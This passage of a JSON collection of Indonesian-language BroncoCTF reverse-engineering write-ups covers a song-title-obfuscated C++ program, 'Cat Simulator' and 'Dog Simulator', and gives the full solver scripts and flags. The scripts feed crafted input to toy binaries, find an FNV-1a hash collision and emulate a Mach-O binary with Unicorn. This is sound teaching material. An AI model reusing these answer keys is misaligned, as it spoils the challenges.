        "content": "Loop berjalan dari `i = 21` dan berhenti setelah `i` menjadi `31`.\n\nKarakter yang ditambahkan berturut-turut:\n\n```text\ni=21 -> _\ni=22 -> 1\ni=23 -> n\ni=25 -> _\ni=26 -> l\ni=27 -> i\ni=29 -> k\ni=30 -> 3\n```\n\nNilai `24` dan `28` dilewati oleh cabang `continue`.\n\nOutput:\n\n```text\n_1n_lik3\n```"
      },
      {
        "title": "Output `part5()`",
        "content": "Untuk `i = 0, 1, 2`, kondisi pertama selalu salah. Fungsi `secretMath()` mengembalikan:\n\n```text\nsecretMath(0) = 100 - 5 = 95  -> _\nsecretMath(1) = 32 * 2  = 64  -> @\nsecretMath(2) = 19 * 5  = 95  -> _\n```\n\nOutput:\n\n```text\n_@_\n```"
      },
      {
        "title": "Output `part6()`",
        "content": "Ekspresi karakter menghasilkan:\n\n```text\nchar(100 + 15)       -> s\nchar(50 + 1)         -> 3\nchar(110 - 7)        -> g\nchar(102 * 1)        -> f\nchar(60 + 12 % 7)    -> A\nchar(130 - 13)       -> u\nchar(54 * 2)         -> l\nchar(122 - 6)        -> t\nchar(25 * 5)         -> }\n```\n\nOutput:\n\n```text\ns3gfAult}\n```"
      },
      {
        "title": "Hasil Akhir",
        "content": "`main()` menggabungkan seluruh fungsi:\n\n```text\nbron\n+ co{\n+ i_c@m3\n+ _1n_lik3\n+ _@_\n+ s3gfAult}\n```\n\nHasil program:\n\n```text\nThe flag is bronco{i_c@m3_1n_lik3_@_s3gfAult}\n```\n\nKalimatnya merupakan parodi lirik:\n\n```text\nI came in like a segfault\n```"
      },
      {
        "title": "Solver",
        "content": "`solve.py` mengganti seluruh judul lagu dengan token C++, mengompilasi source hasil restorasi, menjalankannya, lalu mengambil flag dari output.\n\n```bash\npython3 solve.py totallynormalcode.cpp\n```\n\nSolver juga bisa membaca file hasil copy-paste terminal selama bagian source masih memuat `#include`.\n\nOutput:\n\n```text\nThe flag is bronco{i_c@m3_1n_lik3_@_s3gfAult}\n[+] Flag: bronco{i_c@m3_1n_lik3_@_s3gfAult}\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport re\r\nimport subprocess\r\nimport sys\r\nimport tempfile\r\nfrom pathlib import Path\r\n\r\n# Judul lagu -> token C++.\r\n# Replacement dilakukan dari string terpanjang agar token yang menempel,\r\n# seperti SmallerThanThisThisIsMe, berubah menjadi <= dengan benar.\r\nREPLACEMENTS: dict[str, str] = {\r\n    \"BreakUpWithYourGirlfriendImBored\": \"/\",\r\n    \"FreshOutTheSlammer\": \"]\",\r\n    \"PleasePleasePlease\": \"if\",\r\n    \"SmallerThanThis\": \"<\",\r\n    \"CallItWhatYouWant\": \"string\",\r\n    \"YouBrokeMeFirst\": \"break\",\r\n    \"ShouldveSaidNo\": \"else\",\r\n    \"ComeBackBeHere\": \"return\",\r\n    \"PieceByPiece\": \"[\",\r\n    \"CountingStars\": \"int\",\r\n    \"FromTheStart\": \"(\",\r\n    \"IsItOverNow\": \")\",\r\n    \"BeginAgain\": \"{\",\r\n    \"EndOfTime\": \"}\",\r\n    \"BadIdeaRight\": \"bool\",\r\n    \"TruthHurts\": \"true\",\r\n    \"ThisOrThat\": \"||\",\r\n    \"SameOldLove\": \"==\",\r\n    \"WithoutMe\": \"-\",\r\n    \"FalseGod\": \"false\",\r\n    \"Positions\": \"switch\",\r\n    \"CaseClosed\": \"case\",\r\n    \"AsItWas\": \"default\",\r\n    \"GoodForYou\": \"for\",\r\n    \"DejaVu\": \"while\",\r\n    \"OnMyWay\": \"continue\",\r\n    \"Abcdefu\": \"char\",\r\n    \"ThisIsMe\": \"=\",\r\n    \"PartOfMe\": \"%\",\r\n    \"Starboy\": \"*\",\r\n    \"Greedy\": \"&&\",\r\n    \"Higher\": \">\",\r\n    \"EndGame\": \";\",\r\n    \"Mine\": \"+=\",\r\n    \"More\": \"++\",\r\n}\r\n\r\n\r\ndef extract_cpp(text: str) -> str:\r\n    \"\"\"Ambil source C++ dari file asli atau hasil copy-paste terminal.\"\"\"\r\n    include_pos = text.find(\"#include\")\r\n    if include_pos == -1:\r\n        raise ValueError(\"Tidak menemukan awal source C++ (#include)\")\r\n\r\n    source = text[include_pos:]\r\n\r\n    # Buang prompt terminal yang ikut tersalin setelah source.\r\n    prompt_match = re.search(r\"\\nnata in .+?➜\\s*$\", source)\r\n    if prompt_match:\r\n        source = source[:prompt_match.start()]\r\n\r\n    return source\r\n\r\n\r\ndef restore_source(obfuscated: str) -> str:\r\n    restored = obfuscated\r\n\r\n    # Tiga placeholder operator berada di dalam character literal dengan spasi.\r\n    # Hilangkan spasinya supaya hasil menjadi '*', '{', dan '}'.\r\n    restored = restored.replace(\"' Starboy '\", \"'*'\")\r\n    restored = restored.replace(\"' BeginAgain '\", \"'{'\")\r\n    restored = restored.replace(\"' EndOfTime '\", \"'}'\")\r\n\r\n    for title in sorted(REPLACEMENTS, key=len, reverse=True):\r\n        restored = restored.replace(title, REPLACEMENTS[title])\r\n\r\n    return restored\r\n\r\n\r\ndef compile_and_run(source: str) -> str:\r\n    # Temporary directory tetap dibuat di folder kerja saat solver dijalankan.\r\n    with tempfile.TemporaryDirectory(prefix=\".cpp-unplugged-\", dir=Path.cwd()) as tmp:\r\n        tmp_dir = Path(tmp)\r\n        source_path = tmp_dir / \"restored.cpp\"\r\n        binary_path = tmp_dir / \"restored\"\r\n\r\n        source_path.write_text(source, encoding=\"utf-8\")\r\n\r\n        compile_result = subprocess.run(\r\n            [\"g++\", \"-std=c++17\", \"-O2\", str(source_path), \"-o\", str(binary_path)],\r\n            capture_output=True,\r\n            text=True,\r\n        )\r\n        if compile_result.returncode != 0:\r\n            raise RuntimeError(\r\n                \"Kompilasi gagal:\\n\"\r\n                + compile_result.stdout\r\n                + compile_result.stderr\r\n            )\r\n\r\n        run_result = subprocess.run(\r\n            [str(binary_path)],\r\n            capture_output=True,\r\n            text=True,\r\n        )\r\n        if run_result.returncode != 0:\r\n            raise RuntimeError(\r\n                f\"Program berhenti dengan kode {run_result.returncode}:\\n\"\r\n                + run_result.stdout\r\n                + run_result.stderr\r\n            )\r\n\r\n        return run_result.stdout.strip()\r\n\r\n\r\ndef main() -> None:\r\n    input_path = Path(\r\n        sys.argv[1] if len(sys.argv) > 1 else \"totallynormalcode.cpp\"\r\n    )\r\n\r\n    raw_text = input_path.read_text(encoding=\"utf-8\")\r\n    restored = restore_source(extract_cpp(raw_text))\r\n    output = compile_and_run(restored)\r\n\r\n    match = re.search(r\"bronco\\{[^}\\n]+\\}\", output)\r\n    if not match:\r\n        raise ValueError(f\"Flag tidak ditemukan pada output: {output!r}\")\r\n\r\n    print(output)\r\n    print(f\"[+] Flag: {match.group(0)}\")\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{i_c@m3_1n_lik3_@_s3gfAult}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-rev-catsimulator",
    "title": "Cat Simulator",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "- **CTF:** BroncoCTF\n- **Category:** Reverse\n- **Difficulty:** Medium\n- **Flag:** `bronco{fluffy_baby}`",
    "problemDescription": "- **CTF:** BroncoCTF\n- **Category:** Reverse\n- **Difficulty:** Medium\n- **Flag:** `bronco{fluffy_baby}`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "Binary Linux berupa ELF 64-bit PIE yang sudah di-strip:\n\n```bash\nfile cat-sim-linux\n```\n\nOutput:\n\n```text\ncat-sim-linux: ELF 64-bit LSB pie executable, x86-64, dynamically linked, stripped\n```\n\nPemeriksaan string langsung memperlihatkan beberapa ending dan satu kandidat flag mencurigakan:\n\n```bash\nstrings -a -n 4 cat-sim-linux\n```\n\nPotongan penting:\n\n```text\nYou were so purrfect this week!\nYou're a strange cat, but you're my cat.\nFinal score: %d\nbonco{almost_the\n```\n\n`bonco{almost_there}` sengaja ditaruh sebagai decoy. Prefix-nya bahkan salah karena kehilangan huruf `r`."
      },
      {
        "title": "State Permainan",
        "content": "Program berjalan selama lima hari. State utama yang disimpan:\n\n```text\nscore\nmood\ninvalid_count\ntalk_count\ntotal_talk_length\neat_count\nscratch_count\n```\n\nNilai awal:\n\n```text\nscore = 0\nmood = 10\nsemua counter = 0\n```\n\nEfek setiap pilihan:\n\n| Pilihan | Score | Mood | Counter |\n|---|---:|---:|---|\n| Talk | `+25` | `+7` | `talk_count++` |\n| Scratch | `-50` | `-12` | `scratch_count++` |\n| Eat | `+20` | `+2` | `eat_count++` |\n| Input lain | `0` | `0` | `invalid_count++` |\n\nSaat memilih **Talk**, program juga membaca sebuah string dan menambahkan panjangnya ke `total_talk_length`."
      },
      {
        "title": "Kondisi Flag Asli",
        "content": "Setelah hari kelima, cabang flag asli memeriksa semua kondisi berikut:\n\n```text\ninvalid_count == 0\ntalk_count == 3\nscratch_count == 1\neat_count == 1\nscore == 45\nmood > 0\ntotal_talk_length == 32\n```\n\nDengan tiga Talk, satu Scratch, dan satu Eat:\n\n```text\nscore = 3(25) - 50 + 20\n      = 45\n```\n\nMood akhirnya:\n\n```text\nmood = 10 + 3(7) - 12 + 2\n     = 21\n```\n\nJadi susunan jenis pilihannya boleh berubah, tetapi jumlah setiap pilihan harus tepat. Syarat yang masih perlu diatur manual adalah total panjang tiga pesan, yaitu 32 karakter.\n\nPayload yang dipakai solver:\n\n```text\nDay 1: Talk, kirim 10 karakter\nDay 2: Talk, kirim 10 karakter\nDay 3: Talk, kirim 12 karakter\nDay 4: Scratch\nDay 5: Eat\n```\n\nTotal panjang:\n\n```text\n10 + 10 + 12 = 32\n```"
      },
      {
        "title": "Decoy",
        "content": "Ada cabang terpisah yang aktif jika:\n\n```text\ntotal_talk_length == 32\n```\n\ntetapi kombinasi counter lainnya salah. Cabang ini menampilkan:\n\n```text\nbonco{almost_there}\n```\n\nKarena itu hanya mengejar panjang input 32 tidak cukup."
      },
      {
        "title": "Flag Terenkripsi",
        "content": "Flag asli tidak tersimpan sebagai string plaintext. Byte terenkripsinya berada di `.rodata`, lalu didekripsi hanya setelah seluruh kondisi tersembunyi terpenuhi.\n\nSeed dekripsi memakai nilai mood akhir. Pada jalur benar:\n\n```text\nmood = 21\n```\n\nHasil dekripsinya dimasukkan ke pesan finale:\n\n```text\nOwner: awwww it said \"bronco{fluffy_baby}\"\n```"
      },
      {
        "title": "Menjalankan Manual",
        "content": "```bash\nprintf '\\n1\\naaaaaaaaaa\\n1\\nbbbbbbbbbb\\n1\\ncccccccccccc\\n2\\n3\\n' | ./cat-sim-linux\n```\n\nBagian akhir output:\n\n```text\n(End of day 5) Current score: 45\n\n=== Day 5 Finale ===\nOwner: awwww it said \"bronco{fluffy_baby}\"\n\nFinal score: 45\nHave an ameowsing day!\n```"
      },
      {
        "title": "Solver",
        "content": "`solve.py` mengirim pilihan dan pesan yang memenuhi semua constraint, lalu mengambil flag dari output program.\n\n```bash\npython3 solve.py ./cat-sim-linux\n```\n\nOutput:\n\n```text\nbronco{fluffy_baby}\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport os\r\nimport re\r\nimport subprocess\r\nimport sys\r\nfrom pathlib import Path\r\n\r\n\r\nFLAG_RE = re.compile(r\"bronco\\{[^}\\r\\n]+\\}\")\r\n\r\n\r\ndef build_payload() -> bytes:\r\n    \"\"\"\r\n    Hidden win conditions recovered from the binary:\r\n\r\n    - 5 valid choices\r\n    - talk exactly 3 times\r\n    - scratch exactly once\r\n    - eat exactly once\r\n    - total length of the three talk messages is 32\r\n    - final score is 45\r\n    - mood remains positive\r\n\r\n    Message lengths: 10 + 10 + 12 = 32.\r\n    \"\"\"\r\n    return b\"\".join(\r\n        [\r\n            b\"\\n\",                  # Press Enter to begin\r\n            b\"1\\n\", b\"a\" * 10 + b\"\\n\",\r\n            b\"1\\n\", b\"b\" * 10 + b\"\\n\",\r\n            b\"1\\n\", b\"c\" * 12 + b\"\\n\",\r\n            b\"2\\n\",\r\n            b\"3\\n\",\r\n        ]\r\n    )\r\n\r\n\r\ndef solve(binary_path: Path) -> tuple[str, str]:\r\n    if not binary_path.is_file():\r\n        raise FileNotFoundError(f\"Binary tidak ditemukan: {binary_path}\")\r\n\r\n    binary_path.chmod(binary_path.stat().st_mode | 0o111)\r\n\r\n    result = subprocess.run(\r\n        [str(binary_path.resolve())],\r\n        input=build_payload(),\r\n        capture_output=True,\r\n        timeout=10,\r\n    )\r\n\r\n    output = result.stdout.decode(\"utf-8\", errors=\"replace\")\r\n\r\n    if result.returncode != 0:\r\n        stderr = result.stderr.decode(\"utf-8\", errors=\"replace\")\r\n        raise RuntimeError(\r\n            f\"Program berhenti dengan exit code {result.returncode}\\n\"\r\n            f\"stdout:\\n{output}\\n\"\r\n            f\"stderr:\\n{stderr}\"\r\n        )\r\n\r\n    match = FLAG_RE.search(output)\r\n    if not match:\r\n        raise ValueError(f\"Flag tidak ditemukan pada output:\\n{output}\")\r\n\r\n    return match.group(0), output\r\n\r\n\r\ndef main() -> None:\r\n    binary_path = Path(sys.argv[1] if len(sys.argv) > 1 else \"./cat-sim-linux\")\r\n    flag, _ = solve(binary_path)\r\n    print(flag)\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{fluffy_baby}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-rev-dogsimulator",
    "title": "Dog Simulator",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "- **CTF:** BroncoCTF\n- **Category:** Reverse\n- **Difficulty:** Medium\n- **Flag:** `bronco{mans_best_friend}`",
    "problemDescription": "- **CTF:** BroncoCTF\n- **Category:** Reverse\n- **Difficulty:** Medium\n- **Flag:** `bronco{mans_best_friend}`",
    "tools": [],
    "analysis": "",
    "solution": [
      {
        "title": "Recon",
        "content": "File yang diberikan adalah executable macOS ARM64:\n\n```bash\nfile dog-sim-mac\n```\n\n```text\ndog-sim-mac: Mach-O 64-bit arm64 executable, flags:<NOUNDEFS|DYLDLINK|TWOLEVEL|PIE>\n```\n\nString yang menarik:\n\n```bash\nstrings -a -n 4 dog-sim-mac\n```\n\n```text\nCommand to 'speak':\n(Good boy! combo completed!)\n(He seems to fixate on what your owner called you.)\ngremlin\nOwner: the routine felt right, but the timing was off.\nOwner: the rhythm was almost right. Maybe try a different sequence of tricks.\nOwner: awww he said \"%s\"\n```\n\nBinary tidak menyimpan flag sebagai plaintext. Finale mendekripsi blob 24 byte hanya ketika seluruh state cocok."
      },
      {
        "title": "State yang Dilacak",
        "content": "Program menjalankan enam hari dan menyimpan beberapa state:\n\n```text\nscore\nbond\nenergy\nmood\ncombo_progress\njumlah tiap aksi\njumlah Speak\njumlah total huruf Speak\nhash input Speak\nhash urutan aksi\nvalidasi kata kedua\n```\n\nEfek dasar tiap aksi:\n\n| Aksi | Score | Bond | Energy |\n|---|---:|---:|---:|\n| Bark | `+10` | `+2` | `-4` |\n| Fetch | `+20` | `+5` | `-8` |\n| Sit | `+15` | `+4` | `-2` |\n| Eat | `+10` | `+1` | `+12`, maksimum 60 |\n| Zoomies | `-5` | `0` | `-10` |\n| Speak | `0` | `+3` | `-1` |\n\nFinale meminta jumlah aksi berikut:\n\n```text\nBark      = 1\nFetch     = 1\nSit       = 1\nEat       = 1\nZoomies   = 0\nSpeak     = 2\n```\n\nHasilnya:\n\n```text\nscore  = 10 + 20 + 15 + 10 = 55\nbond   = 12 + 2 + 5 + 4 + 1 + 3 + 3 = 30\nenergy = 40 - 4 - 8 - 2 + 12 - 1 - 1 = 36\n```\n\nNilai tersebut memenuhi pemeriksaan finale: score 55, bond di atas 24, dan energy di atas 20."
      },
      {
        "title": "Urutan Tersembunyi",
        "content": "`combo_progress` membentuk state machine:\n\n```text\nFetch -> 1\nSit   -> 2, hanya jika state sebelumnya 1\nBark  -> 3, hanya jika state sebelumnya 2\nSpeak -> 4, hanya jika state sebelumnya 3 dan command hash cocok\n```\n\nHash urutan aksi di finale harus bernilai:\n\n```text\n0xf5d38524\n```\n\nBrute force seluruh permutasi dari multiset berikut:\n\n```text\nBark, Fetch, Sit, Eat, Speak, Speak\n```\n\nhanya menghasilkan satu urutan yang cocok:\n\n```text\nFetch -> Sit -> Bark -> Speak -> Eat -> Speak\n```\n\nDalam menu program:\n\n```text\n2 -> 3 -> 1 -> 6 -> 4 -> 6\n```"
      },
      {
        "title": "Speak Pertama",
        "content": "Command Speak diproses sebagai lowercase lalu di-hash memakai FNV-1a 32-bit:\n\n```text\noffset basis = 0x811c9dc5\nprime        = 0x01000193\n```\n\nSpeak pertama harus:\n\n```text\npanjang alfabetik = 12\nFNV-1a            = 0x9f58d866\n```\n\nTidak perlu menemukan plaintext asli pembuat challenge. FNV-1a 32-bit mudah dicari collision-nya. Meet-in-the-middle menghasilkan string 12 huruf:\n\n```text\naaaaeywnadhg\n```\n\nVerifikasi:\n\n```python\ndef fnv1a(data):\n    h = 0x811c9dc5\n    for c in data:\n        h ^= ord(c)\n        h = (h * 0x01000193) & 0xffffffff\n    return h\n\nprint(hex(fnv1a(\"aaaaeywnadhg\")))\n```\n\n```text\n0x9f58d866\n```\n\nInput ini mengubah `combo_progress` dari 3 menjadi 4."
      },
      {
        "title": "Speak Kedua",
        "content": "Saat `Speak` dipilih untuk kedua kalinya, program membandingkan hasil normalisasi input dengan konstanta:\n\n```text\ngremlin\n```\n\nIni sesuai kalimat owner pada hari terakhir:\n\n```text\nLast day of the week, little gremlin.\n```\n\nDua command memiliki total panjang:\n\n```text\n12 + 7 = 19\n```\n\nFinale memang meminta total huruf Speak bernilai 19.\n\nHash gabungan dua input juga harus cocok:\n\n```text\n0x740a8a98\n```\n\nKombinasi `aaaaeywnadhg` dan `gremlin` menghasilkan nilai tersebut."
      },
      {
        "title": "State Akhir",
        "content": "| State | Nilai |\n|---|---:|\n| Score | 55 |\n| Bond | 30 |\n| Energy | 36 |\n| Mood | calm |\n| Combo | 4 |\n| Total huruf Speak | 19 |\n| Hash urutan | `0xf5d38524` |\n| Hash Speak | `0x740a8a98` |\n| Validasi `gremlin` | benar |\n\nSemua state dipakai untuk membentuk seed dekripsi. Blob terenkripsi di `__TEXT,__const` kemudian berubah menjadi:\n\n```text\nbronco{mans_best_friend}\n```"
      },
      {
        "title": "Input Manual",
        "content": "Pada macOS ARM64:\n\n```bash\nprintf '\\n2\\n3\\n1\\n6\\naaaaeywnadhg\\n4\\n6\\ngremlin\\n' | ./dog-sim-mac\n```\n\nBagian finale:\n\n```text\n=== Finale ===\nOwner: awww he said \"bronco{mans_best_friend}\"\n```"
      },
      {
        "title": "Solver",
        "content": "`solve.py` menjalankan binary secara native di macOS. Pada Linux, solver memuat Mach-O ARM64 dengan Unicorn, memasang hook minimal untuk fungsi libc, mengirim input valid, lalu mengambil flag dari output.\n\nDependency Linux:\n\n```bash\npython3 -m pip install unicorn\n```\n\nJalankan:\n\n```bash\npython3 solve.py dog-sim-mac\n```\n\nOutput:\n\n```text\nbronco{mans_best_friend}\n```"
      },
      {
        "title": "Solver Script",
        "content": "The complete exploit/solver script (solve.py) is provided below:",
        "code": "#!/usr/bin/env python3\r\nfrom __future__ import annotations\r\n\r\nimport platform\r\nimport re\r\nimport struct\r\nimport subprocess\r\nimport sys\r\nfrom pathlib import Path\r\n\r\nFLAG_RE = re.compile(rb\"bronco\\{[^}\\r\\n]+\\}\")\r\n\r\n# This 12-letter string is an FNV-1a preimage for 0x9f58d866.\r\n# It completes the hidden Fetch -> Sit -> Bark -> Speak combo.\r\nCOMBO_COMMAND = b\"aaaaeywnadhg\"\r\nSECOND_COMMAND = b\"gremlin\"\r\n\r\nPAYLOAD = b\"\".join(\r\n    [\r\n        b\"\\n\",          # Press Enter to begin\r\n        b\"2\\n\",         # Day 1: Fetch\r\n        b\"3\\n\",         # Day 2: Sit\r\n        b\"1\\n\",         # Day 3: Bark\r\n        b\"6\\n\",         # Day 4: Speak\r\n        COMBO_COMMAND + b\"\\n\",\r\n        b\"4\\n\",         # Day 5: Eat\r\n        b\"6\\n\",         # Day 6: Speak\r\n        SECOND_COMMAND + b\"\\n\",\r\n    ]\r\n)\r\n\r\n\r\ndef fnv1a_lower_alpha(data: bytes) -> int:\r\n    value = 0x811C9DC5\r\n    for byte in data:\r\n        char = chr(byte)\r\n        if char.isalpha():\r\n            value ^= ord(char.lower())\r\n            value = (value * 0x01000193) & 0xFFFFFFFF\r\n    return value\r\n\r\n\r\ndef solve_native(binary: Path) -> bytes:\r\n    binary.chmod(binary.stat().st_mode | 0o111)\r\n    result = subprocess.run(\r\n        [str(binary.resolve())],\r\n        input=PAYLOAD,\r\n        capture_output=True,\r\n        timeout=10,\r\n        check=False,\r\n    )\r\n    output = result.stdout + result.stderr\r\n    match = FLAG_RE.search(output)\r\n    if not match:\r\n        raise RuntimeError(\r\n            f\"Flag tidak ditemukan. Exit code: {result.returncode}\\n\"\r\n            + output.decode(\"utf-8\", errors=\"replace\")\r\n        )\r\n    return match.group(0)\r\n\r\n\r\ndef solve_with_unicorn(binary: Path) -> bytes:\r\n    try:\r\n        from unicorn import Uc, UC_ARCH_ARM64, UC_HOOK_CODE, UC_MODE_ARM\r\n        from unicorn.arm64_const import (\r\n            UC_ARM64_REG_PC,\r\n            UC_ARM64_REG_SP,\r\n            UC_ARM64_REG_X0,\r\n            UC_ARM64_REG_X1,\r\n            UC_ARM64_REG_X2,\r\n            UC_ARM64_REG_X30,\r\n        )\r\n    except ImportError as exc:\r\n        raise SystemExit(\r\n            \"Unicorn belum terpasang. Jalankan: python3 -m pip install unicorn\"\r\n        ) from exc\r\n\r\n    blob = binary.read_bytes()\r\n    if blob[:4] != b\"\\xcf\\xfa\\xed\\xfe\":\r\n        raise ValueError(\"File bukan Mach-O 64-bit little-endian\")\r\n\r\n    base = 0x100000000\r\n    entry = 0x100000500\r\n    stop_address = 0x100001310\r\n\r\n    stack_base = 0x70000000\r\n    stack_size = 0x200000\r\n    stack_top = stack_base + stack_size - 0x100\r\n\r\n    fake_base = 0x60000000\r\n\r\n    stubs = {\r\n        0x100001390: \"maskrune\",\r\n        0x10000139C: \"stackfail\",\r\n        0x1000013A8: \"tolower\",\r\n        0x1000013B4: \"atoi\",\r\n        0x1000013C0: \"clearerr\",\r\n        0x1000013CC: \"fflush\",\r\n        0x1000013D8: \"fgets\",\r\n        0x1000013E4: \"printf\",\r\n        0x1000013F0: \"putchar\",\r\n        0x1000013FC: \"puts\",\r\n        0x100001408: \"snprintf\",\r\n        0x100001414: \"strlen\",\r\n    }\r\n\r\n    lines = iter(PAYLOAD.splitlines(keepends=True))\r\n    output_lines: list[bytes] = []\r\n\r\n    emulator = Uc(UC_ARCH_ARM64, UC_MODE_ARM)\r\n    emulator.mem_map(base, 0x8000)\r\n    emulator.mem_write(base, blob[:0x8000])\r\n    emulator.mem_map(stack_base, stack_size)\r\n    emulator.mem_map(fake_base, 0x20000)\r\n\r\n    locale = fake_base + 0x1000\r\n    guard = fake_base + 0x100\r\n    stdin_pointer = fake_base + 0x200\r\n    stdout_pointer = fake_base + 0x208\r\n\r\n    emulator.mem_write(0x100004000, struct.pack(\"<Q\", locale))\r\n    emulator.mem_write(0x100004018, struct.pack(\"<Q\", guard))\r\n    emulator.mem_write(0x100004020, struct.pack(\"<Q\", stdin_pointer))\r\n    emulator.mem_write(0x100004028, struct.pack(\"<Q\", stdout_pointer))\r\n\r\n    emulator.mem_write(guard, struct.pack(\"<Q\", 0x123456789ABCDEF0))\r\n    emulator.mem_write(stdin_pointer, struct.pack(\"<Q\", fake_base + 0x300))\r\n    emulator.mem_write(stdout_pointer, struct.pack(\"<Q\", fake_base + 0x308))\r\n\r\n    # dyld normally rebases these local pointer tables.\r\n    pointer_tables = {\r\n        0x100004080: [\r\n            0x1000018FD,\r\n            0x10000191D,\r\n            0x10000193C,\r\n            0x100001958,\r\n            0x10000197F,\r\n            0x10000199E,\r\n        ],\r\n        0x1000040B0: [\r\n            0x100001A4D,\r\n            0x100001A61,\r\n            0x100001A79,\r\n            0x100001A9C,\r\n        ],\r\n        0x1000040D0: [\r\n            0x100001B38,\r\n            0x100001B3D,\r\n            0x100001B43,\r\n            0x100001B52,\r\n        ],\r\n    }\r\n    for address, values in pointer_tables.items():\r\n        emulator.mem_write(\r\n            address,\r\n            b\"\".join(struct.pack(\"<Q\", value) for value in values),\r\n        )\r\n\r\n    # Minimal __DefaultRuneLocale table. Bit 0x100 marks alphabetic runes.\r\n    for value in range(128):\r\n        flags = 0x100 if chr(value).isalpha() else 0\r\n        emulator.mem_write(locale + 0x3C + value * 4, struct.pack(\"<I\", flags))\r\n\r\n    emulator.reg_write(UC_ARM64_REG_SP, stack_top)\r\n    emulator.reg_write(UC_ARM64_REG_X30, fake_base + 0x1F000)\r\n\r\n    def read_c_string(address: int, limit: int = 4096) -> bytes:\r\n        data = bytearray()\r\n        for offset in range(limit):\r\n            byte = emulator.mem_read(address + offset, 1)[0]\r\n            if byte == 0:\r\n                break\r\n            data.append(byte)\r\n        return bytes(data)\r\n\r\n    def return_from_stub(value: int = 0) -> None:\r\n        emulator.reg_write(UC_ARM64_REG_X0, value & 0xFFFFFFFFFFFFFFFF)\r\n        emulator.reg_write(UC_ARM64_REG_PC, emulator.reg_read(UC_ARM64_REG_X30))\r\n\r\n    def hook_code(uc: Uc, address: int, size: int, user_data: object) -> None:\r\n        if address == stop_address:\r\n            uc.emu_stop()\r\n            return\r\n\r\n        name = stubs.get(address)\r\n        if name is None:\r\n            return\r\n\r\n        x0 = uc.reg_read(UC_ARM64_REG_X0)\r\n        x1 = uc.reg_read(UC_ARM64_REG_X1)\r\n        x2 = uc.reg_read(UC_ARM64_REG_X2)\r\n\r\n        if name == \"fgets\":\r\n            try:\r\n                data = next(lines)\r\n            except StopIteration:\r\n                return_from_stub(0)\r\n                return\r\n            data = data[: max(0, x1 - 1)]\r\n            uc.mem_write(x0, data + b\"\\0\")\r\n            return_from_stub(x0)\r\n            return\r\n\r\n        if name == \"atoi\":\r\n            try:\r\n                value = int(read_c_string(x0).strip() or b\"0\")\r\n            except ValueError:\r\n                value = 0\r\n            return_from_stub(value)\r\n            return\r\n\r\n        if name == \"strlen\":\r\n            return_from_stub(len(read_c_string(x0)))\r\n            return\r\n\r\n        if name == \"tolower\":\r\n            value = x0 & 0xFF\r\n            return_from_stub(ord(chr(value).lower()) if value < 128 else value)\r\n            return\r\n\r\n        if name == \"maskrune\":\r\n            return_from_stub(0)\r\n            return\r\n\r\n        if name == \"snprintf\":\r\n            stack_pointer = uc.reg_read(UC_ARM64_REG_SP)\r\n            argument_pointer = struct.unpack(\r\n                \"<Q\", uc.mem_read(stack_pointer, 8)\r\n            )[0]\r\n            format_string = read_c_string(x2)\r\n            argument = read_c_string(argument_pointer)\r\n            rendered = format_string.replace(b\"%s\", argument)[: max(0, x1 - 1)]\r\n            uc.mem_write(x0, rendered + b\"\\0\")\r\n            return_from_stub(len(rendered))\r\n            return\r\n\r\n        if name == \"puts\":\r\n            output_lines.append(read_c_string(x0))\r\n            return_from_stub(0)\r\n            return\r\n\r\n        if name == \"stackfail\":\r\n            raise RuntimeError(\"Stack canary failure during emulation\")\r\n\r\n        # printf, putchar, fflush, and clearerr do not affect the state machine.\r\n        return_from_stub(0)\r\n\r\n    emulator.hook_add(UC_HOOK_CODE, hook_code)\r\n    emulator.emu_start(entry, fake_base + 0x1F000, count=1_000_000)\r\n\r\n    output = b\"\\n\".join(output_lines)\r\n    match = FLAG_RE.search(output)\r\n    if not match:\r\n        raise RuntimeError(\r\n            \"Flag tidak ditemukan pada output emulasi:\\n\"\r\n            + output.decode(\"utf-8\", errors=\"replace\")\r\n        )\r\n    return match.group(0)\r\n\r\n\r\ndef main() -> None:\r\n    binary = Path(sys.argv[1] if len(sys.argv) > 1 else \"dog-sim-mac\")\r\n    if not binary.is_file():\r\n        raise SystemExit(f\"Binary tidak ditemukan: {binary}\")\r\n\r\n    if len(COMBO_COMMAND) != 12:\r\n        raise AssertionError(\"Combo command harus berisi 12 huruf\")\r\n    if fnv1a_lower_alpha(COMBO_COMMAND) != 0x9F58D866:\r\n        raise AssertionError(\"Combo command tidak memenuhi hash tersembunyi\")\r\n\r\n    if platform.system() == \"Darwin\":\r\n        flag = solve_native(binary)\r\n    else:\r\n        flag = solve_with_unicorn(binary)\r\n\r\n    print(flag.decode(\"ascii\"))\r\n\r\n\r\nif __name__ == \"__main__\":\r\n    main()"
      }
    ],
    "terminalOutputs": [],
    "flag": "bronco{mans_best_friend}",
    "lessonsLearned": ""
  },
  {
    "id": "broncoctf-rev-mirrormirror",
    "title": "Mirror Mirror",
    "category": "Reverse",
    "difficulty": "Medium",
    "points": 0,
    "date": "2026-07-14",
    "author": "Nattt",
    "ctfName": "BroncoCTF",
    "tags": [],
    "description": "Writeup for challenge Mirror Mirror",
    "problemDescription": "Program tidak memakai algoritma kriptografi berat. Flag disimpan sebagai byte array terenkripsi dan dibuka memakai dua komponen:\n\n1. SHA-256 dari 300 karakter source code mulai marker `MIRROR_SURFACE_DO_NOT_SCRATCH`.\n2. String statis `MirrorMirror`.\n\nSetelah kedua komponen direkonstruksi, setiap byte pada `blob` cukup di-XOR kembali.",
    "tools": [],
    "analysis": "",
